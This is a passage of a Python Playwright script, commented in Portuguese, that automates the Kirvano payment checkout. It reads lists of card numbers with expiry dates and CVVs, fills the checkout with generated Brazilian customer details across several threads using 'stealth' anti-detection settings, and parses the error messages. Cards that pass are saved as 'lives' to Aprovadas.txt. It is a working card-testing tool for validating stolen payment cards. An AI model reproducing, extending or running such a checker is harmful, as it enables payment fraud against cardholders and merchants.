            # Estratégia 2: Busca por div com classe button-content
            try:
                button_content = await page.wait_for_selector('div.button-content:has-text("Comprar agora")', timeout=2000)
                await button_content.click()
                return True
            except:
                pass
            
            # Estratégia 3: Clique via coordenadas (último recurso)
            try:
                # Busca o botão por qualquer método e clica via coordenadas
                button_element = await page.query_selector('button[type="submit"]')
                if button_element:
                    box = await button_element.bounding_box()
                    if box:
                        await page.mouse.click(box['x'] + box['width']/2, box['y'] + box['height']/2)
                        return True
            except:
                pass
            
            return False
            
        except Exception as e:
            return False
    
    async def capture_error_message(self, page):
        """Captura mensagens de erro após o envio - Foco na caixa específica de erro"""
        try:
            # Aguarda apenas 0.5 segundo para o erro aparecer
            await asyncio.sleep(0.5)
            
            error_found = False
            error_text = ""
            
            # Seletores específicos para a caixa de erro da Kirvano
            error_selectors = [
                # Caixa específica de erro da Kirvano
                'div.c-fkXJhu',
                'div.c-iGdsXb.c-iGdsXb-hnMDGD-type-error',
                'div.c-dzVonm',
                'div.c-bUqmCP',
                # Elementos de texto dentro da caixa
                'div.c-fkXJhu span',
                'div.c-fkXJhu div:last-child',
                # Fallback para outras notificações
                'div[class*="error"]',
                'div[class*="notification"]',
                'div[class*="alert"]',
                'div[role="alert"]',
                # Seletores mais genéricos para capturar qualquer erro
                'div[class*="c-"]:has-text("erro")',
                'div[class*="c-"]:has-text("error")',
                'div[class*="c-"]:has-text("inválido")',
                'div[class*="c-"]:has-text("invalid")',
                'div[class*="c-"]:has-text("falha")',
                'div[class*="c-"]:has-text("failed")',
                'div[class*="c-"]:has-text("rejeitado")',
                'div[class*="c-"]:has-text("rejected")',
                'div[class*="c-"]:has-text("bloqueado")',
                'div[class*="c-"]:has-text("blocked")',
                'div[class*="c-"]:has-text("cartão")',
                'div[class*="c-"]:has-text("card")',
                'div[class*="c-"]:has-text("pagamento")',
                'div[class*="c-"]:has-text("payment")'
            ]
            
            # Tenta capturar rapidamente com timeout alto
            for selector in error_selectors:
                try:
                    error_element = await page.wait_for_selector(selector, timeout=5000)
                    if error_element:
                        text = await error_element.text_content()
                        if text and text.strip():
                            # Filtra apenas erros específicos de cartão/pagamento
                            error_keywords = ['erro', 'error', 'inválido', 'invalid', 'falha', 'failed', 
                                            'rejeitado', 'rejected', 'bloqueia', 'block', 'tente', 'try', 
                                            'novamente', 'again', 'cartão', 'card', 'pagamento', 'payment',
                                            'transação', 'transaction', 'não autorizado', 'unauthorized',
                                            'processar', 'process', 'banco', 'bank', 'vencido', 'expired',
                                            'cvv', 'cvc', 'número', 'number', 'titular', 'holder']
                            
                            text_lower = text.strip().lower()
                            if any(keyword in text_lower for keyword in error_keywords):
                                error_text = text.strip()
                                error_found = True
                                return error_text  # Retorna a mensagem de erro imediatamente
                except:
                    continue
            
            # Se não encontrou erro específico, tenta capturar qualquer texto de erro
            if not error_found:
                try:
                    # Procura por qualquer div com texto que pareça erro
                    all_divs = await page.query_selector_all('div')
                    for div in all_divs:
                        try:
                            text = await div.text_content()
                            if text and text.strip():
                                text_lower = text.strip().lower()
                                if any(keyword in text_lower for keyword in error_keywords):
                                    error_text = text.strip()
                                    return error_text
                        except:
                            continue
                except:
                    pass
            
            # Aguarda mais um pouco para capturar erros tardios
            await asyncio.sleep(2.0)
            
            return False  # Indica que não encontrou erro
            
        except Exception as e:
            return False
    
    async def select_email_domain_stealth(self, page):
        """Seleciona o domínio do e-mail com técnicas stealth"""
        try:
            gmail_option = await page.wait_for_selector('li:has-text("@gmail.com")', timeout=1500)
            await gmail_option.click()
        except:
            try:
                await page.keyboard.press("Tab")
                await page.keyboard.press("Enter")
            except:
                pass
    
    async def select_country_stealth(self, page):
        """Seleciona o país com técnicas stealth"""
        try:
            country_select = await page.wait_for_selector('select.PhoneInputCountrySelect', timeout=2000)
            await country_select.select_option(value="BR")
        except:
            try:
                country_icon = await page.wait_for_selector('.PhoneInputCountryIcon', timeout=1500)
                await country_icon.click()
                brazil_option = await page.wait_for_selector('option[value="BR"]', timeout=1500)
                await brazil_option.click()
            except:
                pass

    def _process_results(self):
        """Processa e exibe os resultados de todas as threads"""
        
        results = []
        while not self.results_queue.empty():
            results.append(self.results_queue.get())
        
        # Estatísticas
        total_tests = len(results)
        successful = len([r for r in results if r['result'] == 'SUCCESS'])
        failed = len([r for r in results if r['result'] == 'FAILED'])
        errors = len([r for r in results if r['result'] == 'ERROR'])
        
        # Salva resultados em arquivo TXT
        with open('kirvano_results.txt', 'w', encoding='utf-8') as f:
            f.write("=== RESULTADOS KIRVANO ===\n")
            f.write(f"Total de testes: {total_tests}\n")
            f.write(f"Sucessos: {successful}\n")
            f.write(f"Falhas: {failed}\n")
            f.write(f"Erros: {errors}\n")
            f.write("=" * 50 + "\n\n")
            
            for result in results:
                f.write(f"Thread: {result['thread_id']}\n")
                f.write(f"Cartão: {result['card_number']}\n")
                f.write(f"Cliente: {result['customer_name']}\n")
                f.write(f"Resultado: {result['result']}\n")
                if 'error' in result:
                    f.write(f"Erro: {result['error']}\n")
                f.write("-" * 30 + "\n")
        
        # Salva apenas as lives aprovadas em arquivo separado
        lives_aprovadas = []
        for result in results:
            if result['result'] == 'SUCCESS':
                # Extrai informações do cartão do resultado
                card_number = result['card_number'].replace(' ', '')
                # Aqui você pode adicionar mais informações se necessário
                lives_aprovadas.append({
                    'card': card_number,
                    'customer': result['customer_name'],
                    'thread': result['thread_id']
                })
        
        if lives_aprovadas:
            with open('Aprovadas.txt', 'w', encoding='utf-8') as f:
                f.write(f"Total de lives: {len(lives_aprovadas)}\n")
                f.write("=" * 40 + "\n\n")
                
                for live in lives_aprovadas:
                    # Extrai dados do cartão do resultado
                    card_parts = live['card'].split('|') if '|' in live['card'] else [live['card'], '', '', '']
                    card_number = card_parts[0] if len(card_parts) > 0 else live['card']
                    card_month = card_parts[1] if len(card_parts) > 1 else ''
                    card_year = card_parts[2] if len(card_parts) > 2 else ''
                    card_cvv = card_parts[3] if len(card_parts) > 3 else ''
                    
                    f.write(f"{card_number}|{card_month}|{card_year}|{card_cvv} com erro LIVE\n")
        
        # Resultados salvos silenciosamente

    def run(self):
        """Método principal que executa a automação"""
        if self.cards_list:
            self.run_multithreaded()
        else:
            # Executa teste único
            if not hasattr(self, 'data') or not self.data:
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                self.data = loop.run_until_complete(self.generate_brazilian_data())
                loop.close()
            self._run_single_test_thread(self.card_data)

async def main():
    """Função principal"""
    parser = argparse.ArgumentParser(description="Automação Kirvano STEALTH - MULTITHREADING - Técnicas avançadas anti-detecção")
    parser.add_argument("--headless", action="store_true", help="Executar em modo headless")
    parser.add_argument("--slow", type=int, default=1000, help="Delay entre ações (ms)")
    parser.add_argument("--auto-generate", action="store_true", help="Gerar dados brasileiros aleatórios automaticamente")
    parser.add_argument("--threads", type=int, default=3, help="Número máximo de threads (padrão: 3)")
    parser.add_argument("--max-retries", type=int, default=3, help="Número máximo de tentativas por cartão (padrão: 3)")
    parser.add_argument("--url", type=str, help="URL da página Kirvano")
    
    # Argumentos para dados do cliente
    parser.add_argument("--nome", type=str, help="Nome completo do cliente")
    parser.add_argument("--email", type=str, help="E-mail do cliente")
    parser.add_argument("--cpf", type=str, help="CPF do cliente")
    parser.add_argument("--celular", type=str, help="Celular do cliente")
    
    # Argumentos para dados do cartão
    parser.add_argument("--titular", type=str, help="Nome do titular do cartão")
    parser.add_argument("--numero", type=str, help="Número do cartão")
    parser.add_argument("--vencimento", type=str, help="Data de vencimento (MM/AA)")
    parser.add_argument("--cvv", type=str, help="CVV do cartão")
    
    # Argumento para arquivo de cartões
    parser.add_argument("--cards", type=str, help="Arquivo de cartões (formato: numero|mes|ano|cvv)")
    
    args = parser.parse_args()
    
    # Se não foi fornecida URL via argumento, pergunta no terminal
    if not args.url:
        print(f"{Fore.CYAN}========================================{Style.RESET_ALL}")
        print(f"{Fore.CYAN}    KIRVANO AUTOMATION MULTITHREAD{Style.RESET_ALL}")
        print(f"{Fore.CYAN}========================================{Style.RESET_ALL}")
        print()
        print(f"{Fore.YELLOW}Digite a URL da página Kirvano que deseja utilizar:{Style.RESET_ALL}")
        print(f"{Fore.WHITE}Exemplo: https://pay.kirvano.com/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx{Style.RESET_ALL}")
        print()
        args.url = input(f"{Fore.GREEN}URL: {Style.RESET_ALL}").strip()
        
        if not args.url:
            print(f"{Fore.RED}URL não fornecida! Usando URL padrão.{Style.RESET_ALL}")
            args.url = "https://pay.kirvano.com/a88f1635-2808-4bd0-b763-e43d2832299b"
        else:
            print(f"{Fore.GREEN}URL configurada: {args.url}{Style.RESET_ALL}")
        print()
    
    # Usuário fixo como Center_LT
    user_name = "Center_LT"
    print(f"{Fore.GREEN}Usuário configurado: @{user_name}{Style.RESET_ALL}")
    print()
    
    # Pergunta quantas abas/threads usar
    print(f"{Fore.YELLOW}Quantas abas/threads você deseja abrir?{Style.RESET_ALL}")
    print(f"{Fore.WHITE}Recomendado: 2-5 threads (padrão: 3){Style.RESET_ALL}")
    print()
    threads_input = input(f"{Fore.GREEN}Número de threads: {Style.RESET_ALL}").strip()
    
    if threads_input.isdigit() and int(threads_input) > 0:
        args.threads = int(threads_input)
        print(f"{Fore.GREEN}Threads configuradas: {args.threads}{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}Valor inválido! Usando padrão: 3 threads{Style.RESET_ALL}")
        args.threads = 3
    print()
    
    print("Iniciando automacao Kirvano...")
    
    # Processa dados do cliente
    customer_data = None
    card_data = None
    
    # Usa argumentos individuais se fornecidos
    if any([args.nome, args.email, args.cpf, args.celular]):
        customer_data = {}
        if args.nome:
            customer_data["nome_completo"] = args.nome
        if args.email:
            customer_data["email"] = args.email
        if args.cpf:
            customer_data["cpf"] = args.cpf
        if args.celular:
            customer_data["celular"] = args.celular
        customer_data["pais"] = "Brazil"  # Padrão
    
    if any([args.titular, args.numero, args.vencimento, args.cvv]):
        card_data = {}
        if args.titular:
            card_data["titular"] = args.titular
        if args.numero:
            card_data["numero"] = args.numero
        if args.vencimento:
            card_data["vencimento"] = args.vencimento
        if args.cvv:
            card_data["cvv"] = args.cvv
    
    automation = KirvanoStealthAutomation(
        headless=args.headless,
        slow_mo=args.slow,
        card_data=card_data,
        customer_data=customer_data,
        cards_file=args.cards,
        max_threads=args.threads,
        max_retries=args.max_retries,
        url=args.url,
        user_name=user_name
    )
    
    # Se solicitado para gerar dados automaticamente, força a geração
    if args.auto_generate:
        automation.data = None  # Força a geração no método run()
    
    automation.run()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        # Interrompido silenciosamente
        pass
    except Exception as e:
        print(f"Erro fatal: {e}")
        sys.exit(1)
